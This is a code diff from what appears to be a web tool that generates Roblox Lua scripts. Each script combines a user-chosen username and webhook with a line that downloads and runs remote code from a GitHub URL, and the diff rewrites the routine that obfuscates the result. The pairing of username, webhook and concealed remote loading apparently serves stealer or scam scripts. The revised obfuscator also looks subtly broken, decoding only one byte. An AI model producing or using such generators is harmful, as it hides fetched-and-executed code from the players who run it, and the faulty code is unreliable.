@@ -73,10 +73,7 @@
             "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
         };function obfuscateScript(script) {
         let hexEncoded = script.split('').map(char => "\\x" + char.charCodeAt(0).toString(16)).join('');
-        let base64Encoded = btoa(hexEncoded);
-        let doubleHex = base64Encoded.split('').map(char => "\\x" + char.charCodeAt(0).toString(16)).join('');
-        let junk = Array(300).fill().map(() => "\\x" + Math.floor(Math.random() * 256).toString(16)).join('');
-        return `loadstring((${junk}) .. "${doubleHex}" .. (${junk}))()`;
+        return `return(function(...)local P={'${hexEncoded}'} for i=1,#P do P[i]=string.char(P[i]:match("\\x(%x%x)")) end loadstring(table.concat(P))(...) end)(...)`;
     }
     
     function generateScript() {
@@ -91,7 +88,8 @@
         }
 
         let script = `Username = "${username}"
-        Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
+
+Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
 
 if (obfuscate) {
             script = obfuscateScript(script);
